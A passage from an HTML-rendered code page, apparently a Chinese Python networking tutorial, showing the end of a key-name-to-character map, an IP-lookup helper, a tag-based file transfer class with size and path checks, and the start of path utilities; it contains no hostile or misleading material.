  <span class="string">&#x27;Shift-w&#x27;</span>:           <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-x&#x27;</span>:           <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-y&#x27;</span>:           <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-z&#x27;</span>:           <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Ins&#x27;</span>:       <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-End&#x27;</span>:       <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Down&#x27;</span>:      <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-PageDown&#x27;</span>:  <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Left&#x27;</span>:      <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-NumPad5&#x27;</span>:   <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Right&#x27;</span>:     <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Home&#x27;</span>:      <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Up&#x27;</span>:        <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-PageUp&#x27;</span>:    <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-*&#x27;</span>:         <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-+&#x27;</span>:         <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock--&#x27;</span>:         <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Del&#x27;</span>:       <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-/&#x27;</span>:         <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-;&#x27;</span>:           <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-=&#x27;</span>:           <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-,&#x27;</span>:           <span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift--&#x27;</span>:           <span class="string">&#x27;_&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-.&#x27;</span>:           <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-/&#x27;</span>:           <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-`&#x27;</span>:           <span class="string">&#x27;~&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-[&#x27;</span>:           <span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-\\&#x27;</span>:          <span class="string">&#x27;|&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-]&#x27;</span>:           <span class="string">&#x27;&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-\&#x27;&#x27;</span>:          <span class="string">&#x27;\&quot;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="myip-py"><a href="#myip-py" class="headerlink" title="myip.py"></a>myip.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myip_wan</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;http://bot.whatismyipaddress.com&#x27;</span></span><br><span class="line">    ip  = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(url) <span class="keyword">as</span> fp:</span><br><span class="line">        ip  = fp.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(ip, <span class="built_in">bytes</span>):</span><br><span class="line">            ip = ip.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myip_lan</span>():</span></span><br><span class="line">    <span class="keyword">import</span> socket</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    s.connect((<span class="string">&quot;8.8.8.8&quot;</span>, <span class="number">53</span>))</span><br><span class="line">    ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip = myip_wan()</span><br><span class="line">    <span class="built_in">print</span>(ip)</span><br><span class="line">    ip = myip_lan()</span><br><span class="line">    <span class="built_in">print</span>(ip)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="netapi-py"><a href="#netapi-py" class="headerlink" title="netapi.py"></a>netapi.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">sys.path.insert(<span class="number">0</span>,os.path.join(BASE_DIR,<span class="string">&#x27;00网络编程&#x27;</span>))</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> inout <span class="keyword">import</span> InitIO, InOutException</span><br><span class="line"><span class="keyword">from</span> path <span class="keyword">import</span> split_path</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">FILE_BEGIN_TAG   = <span class="string">b&#x27;FILEBEG0&#x27;</span></span><br><span class="line">FILE_END_TAG     = <span class="string">b&#x27;FILEEND0&#x27;</span></span><br><span class="line">FILE_SIZE_TAG    = <span class="string">b&#x27;FILESIZE&#x27;</span></span><br><span class="line">FILE_NAME_TAG    = <span class="string">b&#x27;FILENAME&#x27;</span></span><br><span class="line">FILE_CONTENT_TAG = <span class="string">b&#x27;FILEDATA&#x27;</span></span><br><span class="line">FILE_BLOCKS_TAG  = <span class="string">b&#x27;FILEBLKS&#x27;</span></span><br><span class="line">FILE_SUCCESS_TAG = <span class="string">b&#x27;FILEGOOD&#x27;</span></span><br><span class="line">FILE_FAIL_TAG    = <span class="string">b&#x27;FILEFAIL&#x27;</span></span><br><span class="line">FILE_ABORT_TAG   = <span class="string">b&#x27;FILEABRT&#x27;</span></span><br><span class="line">FILE_TAG_SIZE    = <span class="built_in">len</span>(FILE_BEGIN_TAG)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetAPI</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, iHandle=<span class="literal">None</span>, oHandle=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> iHandle:</span><br><span class="line">            iHandle    = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oHandle:</span><br><span class="line">            oHandle    = iHandle</span><br><span class="line">        self.iHandle   = InitIO(iHandle)</span><br><span class="line">        self.oHandle   = InitIO(oHandle)</span><br><span class="line">        self.savePath  = <span class="string">&#x27;SavedFiles&#x27;</span></span><br><span class="line">        self.maxSize   = <span class="number">2147483647</span></span><br><span class="line">        self.blockSize = <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_data</span>(<span class="params">self</span>):</span>          <span class="keyword">return</span> self.iHandle.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_tag</span>(<span class="params">self, tag</span>):</span>      self.oHandle.write(tag, <span class="literal">True</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_data</span>(<span class="params">self, data</span>):</span>    self.oHandle.write(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_file</span>(<span class="params">self, path</span>):</span></span><br><span class="line">        fileName = os.path.abspath(path)</span><br><span class="line">        fileSize = os.path.getsize(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.debug(<span class="string">&#x27;test for %s&#x27;</span>, fileName)</span><br><span class="line">            <span class="built_in">open</span>(fileName, <span class="string">&#x27;rb&#x27;</span>)     <span class="comment"># test if the file is accessible</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">&#x27;Exception while testing opening: %s %s&#x27;</span>, fileName, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> fileSize &gt; self.blockSize:</span><br><span class="line">            fileTag, fileSend = (FILE_BLOCKS_TAG,  <span class="keyword">lambda</span>: self.send_blocks(path),)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fileTag, fileSend = (FILE_CONTENT_TAG, <span class="keyword">lambda</span>: self.send_content(path),)</span><br><span class="line">        fileInfo = [</span><br><span class="line">            (FILE_BEGIN_TAG,   <span class="literal">None</span>),</span><br><span class="line">            (FILE_NAME_TAG,    <span class="keyword">lambda</span>: self.send_name(fileName),),</span><br><span class="line">            (FILE_SIZE_TAG,    <span class="keyword">lambda</span>: self.send_size(fileSize),),</span><br><span class="line">            (fileTag,          fileSend,),</span><br><span class="line">            (FILE_END_TAG,     <span class="literal">None</span>,),</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> tag, sendAction <span class="keyword">in</span> fileInfo:</span><br><span class="line">            backTag = <span class="literal">None</span></span><br><span class="line">            error = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.send_tag(tag)</span><br><span class="line">                logging.debug(<span class="string">&#x27;waiting for response after send tag %s&#x27;</span>, tag)</span><br><span class="line">                self.recv_data()</span><br><span class="line">            <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">                logging.info(<span class="string">&#x27;get tag %s&#x27;</span>, e.args[<span class="number">0</span>])</span><br><span class="line">                backTag = e.args[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception when send tag: %s %s&#x27;</span>, tag, <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception when send: %s %s&#x27;</span>, tag, <span class="built_in">str</span>(e))</span><br><span class="line">                error = FILE_ABORT_TAG</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> error:</span><br><span class="line">                self.send_tag(error)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            error = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> sendAction: <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                sendAction()</span><br><span class="line">                logging.debug(<span class="string">&#x27;wait for response after action&#x27;</span>)</span><br><span class="line">                self.recv_data()</span><br><span class="line">            <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">                logging.info(<span class="string">&#x27;Exception when send action: %s %s&#x27;</span>, tag, e.args[<span class="number">0</span>])</span><br><span class="line">                backTag = e.args[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">                error = FILE_ABORT_TAG</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> error:</span><br><span class="line">                self.send_tag(error)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> backTag != FILE_SUCCESS_TAG:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_content</span>(<span class="params">self, fileName</span>):</span></span><br><span class="line">        logging.debug(<span class="string">&#x27;send content %s&#x27;</span>, fileName)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            filedata = <span class="built_in">open</span>(fileName, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">            self.send_data(filedata)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">&#x27;send_content.Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(filedata)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_success</span>(<span class="params">self</span>):</span>       self.send_tag(FILE_SUCCESS_TAG)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_fail</span>(<span class="params">self</span>):</span>          self.send_tag(FILE_FAIL_TAG)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_abort</span>(<span class="params">self</span>):</span>         self.send_tag(FILE_ABORT_TAG)</span><br><span class="line">    <span class="comment"># receive</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_file</span>(<span class="params">self</span>):</span></span><br><span class="line">        receiver = &#123;</span><br><span class="line">            FILE_NAME_TAG:    self.recv_name,</span><br><span class="line">            FILE_SIZE_TAG:    self.recv_size,</span><br><span class="line">            FILE_CONTENT_TAG: self.recv_content,</span><br><span class="line">            FILE_BLOCKS_TAG:  self.recv_blocks,</span><br><span class="line">        &#125;</span><br><span class="line">        result  = &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            tag = <span class="literal">None</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;wait for tag&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data        =  self.recv_data()</span><br><span class="line">                <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">                tag         = e.args[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;get tag: %s&#x27;</span>, tag)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> tag: <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> tag == FILE_BEGIN_TAG:</span><br><span class="line">                result = &#123;&#125;</span><br><span class="line">                logging.debug(<span class="string">&#x27;send success after get tag&#x27;</span>)</span><br><span class="line">                self.send_success()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> tag == FILE_END_TAG:</span><br><span class="line">                logging.debug(<span class="string">&#x27;send success after get tag&#x27;</span>)</span><br><span class="line">                self.send_success()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> tag == FILE_ABORT_TAG:</span><br><span class="line">                logging.debug(<span class="string">&#x27;abort&#x27;</span>)</span><br><span class="line">                result = &#123;&#125;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            self.send_success()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                logging.debug(<span class="string">&#x27;wait for receive data&#x27;</span>)</span><br><span class="line">                data = receiver.get(tag, (<span class="keyword">lambda</span> : <span class="literal">None</span>))()</span><br><span class="line">                <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">break</span></span><br><span class="line">                result[tag] = data</span><br><span class="line">                logging.debug(<span class="string">&#x27;send success after receive data&#x27;</span>)</span><br><span class="line">                self.send_success()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">                tag         = e.args[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> tag: <span class="keyword">break</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;send fail after data&#x27;</span>)</span><br><span class="line">            self.send_fail()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">            result = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_verify</span>(<span class="params">self, result</span>):</span></span><br><span class="line">        essential_flag = &#123;FILE_NAME_TAG:<span class="number">1</span>,    FILE_SIZE_TAG:<span class="number">2</span>,</span><br><span class="line">                          FILE_CONTENT_TAG:<span class="number">4</span>, FILE_BLOCKS_TAG:<span class="number">4</span>&#125;</span><br><span class="line">        flag = <span class="built_in">sum</span>([essential_flag.get(x) <span class="keyword">for</span> x <span class="keyword">in</span> result.keys()])</span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">7</span>: result = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_size</span>(<span class="params">self</span>):</span></span><br><span class="line">        size = self.recv_data()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(size, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid size type %s&#x27;</span> % <span class="built_in">type</span>(size))</span><br><span class="line">        logging.debug(<span class="string">&#x27;filesize: %s&#x27;</span>, size)</span><br><span class="line">        <span class="keyword">return</span> size</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        path = self.recv_data()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid name type %s&#x27;</span> % <span class="built_in">type</span>(path))</span><br><span class="line">        namelist = path.split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> namelist:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;dangerous path&#x27;</span>)</span><br><span class="line">        name = os.path.join(*namelist)</span><br><span class="line">        logging.debug(<span class="string">&#x27;filename: %s&#x27;</span>, name)</span><br><span class="line">        <span class="keyword">return</span> name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_blocks</span>(<span class="params">self, fileName</span>):</span></span><br><span class="line">        logging.debug(<span class="string">&#x27;send blocks %s&#x27;</span>, fileName)</span><br><span class="line">        fp        = <span class="built_in">open</span>(fileName, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        blockID   = <span class="number">0</span></span><br><span class="line">        totalSize = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            block      = fp.read(self.blockSize)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> block: <span class="keyword">break</span></span><br><span class="line">            blockID   += <span class="number">1</span></span><br><span class="line">            self.send_data(blockID)</span><br><span class="line">            self.send_data(block)</span><br><span class="line">            totalSize += <span class="built_in">len</span>(block)</span><br><span class="line">            backID     = self.recv_data()</span><br><span class="line">            <span class="keyword">if</span> backID != blockID:</span><br><span class="line">                self.send_fail()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        self.send_data(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> totalSize</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_size</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.send_data(n)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_name</span>(<span class="params">self, path</span>):</span></span><br><span class="line">        fileName = <span class="string">&#x27;\t&#x27;</span>.join(split_path(path))</span><br><span class="line">        <span class="keyword">return</span> self.send_data(fileName)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_content</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.recv_data()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid content type %s&#x27;</span> % <span class="built_in">type</span>(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_blocks</span>(<span class="params">self</span>):</span></span><br><span class="line">        totalSize   = <span class="number">0</span></span><br><span class="line">        lastBlockID = <span class="number">0</span></span><br><span class="line">        fileName = os.path.abspath(os.path.join(self.savePath, <span class="string">&#x27;TEMP%x&#x27;</span> % <span class="built_in">int</span>(time.time())))</span><br><span class="line">        dirname  = os.path.dirname(fileName)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirname):</span><br><span class="line">            os.makedirs(dirname)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fileName, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                blockID = self.recv_data()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(blockID, <span class="built_in">int</span>):</span><br><span class="line">                    <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid type of block id %s&#x27;</span> % <span class="built_in">type</span>(blockID))</span><br><span class="line">                <span class="keyword">if</span> blockID == <span class="number">0</span>:  <span class="comment"># end of block</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> lastBlockID + <span class="number">1</span> != blockID:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;block ID error last:%d current:%d&#x27;</span> % (lastBlockID, blockID))</span><br><span class="line">                lastBlockID = blockID</span><br><span class="line">                block   = self.recv_data()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(block, <span class="built_in">bytes</span>):</span><br><span class="line">                    <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid type of block %s&#x27;</span> % <span class="built_in">type</span>(blockID))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(block) + totalSize &gt; self.maxSize:</span><br><span class="line">                    <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;exceed max file size limit&#x27;</span>)</span><br><span class="line">                fp.write(block)</span><br><span class="line">                self.send_data(blockID)</span><br><span class="line">        <span class="keyword">return</span> fileName</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.iHandle.close()</span><br><span class="line">        self.oHandle.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span>(<span class="params">fileInfo, target</span>):</span></span><br><span class="line">    fileName = fileInfo.get(FILE_NAME_TAG)</span><br><span class="line">    fileSize = fileInfo.get(FILE_SIZE_TAG)</span><br><span class="line">    content  = fileInfo.get(FILE_CONTENT_TAG)</span><br><span class="line">    tempFile = fileInfo.get(FILE_BLOCKS_TAG)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fileName:</span><br><span class="line">        logging.debug(<span class="string">&#x27;invalid filename: %s&#x27;</span>, fileName)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fileSize:</span><br><span class="line">        logging.debug(<span class="string">&#x27;invalid filename: %d&#x27;</span>, fileSize)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">or</span> tempFile:</span><br><span class="line">        fullName = os.path.join(target, fileName)</span><br><span class="line">        dirname  = os.path.dirname(fullName)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirname):</span><br><span class="line">            os.makedirs(dirname)</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            logging.debug(<span class="string">&#x27;save content&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(content) != fileSize:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;size unmatched&#x27;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(fullName, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                fp.write(content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.debug(<span class="string">&#x27;save blocks from %s to %s&#x27;</span>, tempFile, fullName)</span><br><span class="line">            <span class="keyword">if</span> os.path.getsize(tempFile) != fileSize:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;size unmatched&#x27;</span>)</span><br><span class="line">            shutil.move(tempFile, fullName)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="path-py"><a href="#path-py" class="headerlink" title="path.py"></a>path.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">sys.path.insert(<span class="number">0</span>,os.path.join(BASE_DIR,<span class="string">&#x27;00网络编程&#x27;</span>))</span><br><span class="line"><span class="keyword">import</span> stat</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_path</span>(<span class="params">path</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        head, tail = os.path.split(path)</span><br><span class="line">        <span class="keyword">if</span> tail:</span><br><span class="line">            result.insert(<span class="number">0</span>, tail)</span><br><span class="line">            path = head</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head = head.strip(<span class="string">&#x27;/:\\&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> head: result.insert(<span class="number">0</span>, head)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_dir</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path, <span class="built_in">str</span>): <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):  <span class="keyword">return</span></span><br><span class="line">        st = os.stat(path)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span>(st.st_mode &amp; stat.S_IRUSR):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">            fileList = os.listdir(path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> path</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.debug(<span class="string">&#x27;Exception: %s %s, abort&#x27;</span>, path, <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> fileList:</span><br><span class="line">        fullpath = os.path.join(path, name)</span><br><span class="line">        <span class="keyword">yield</span> <span 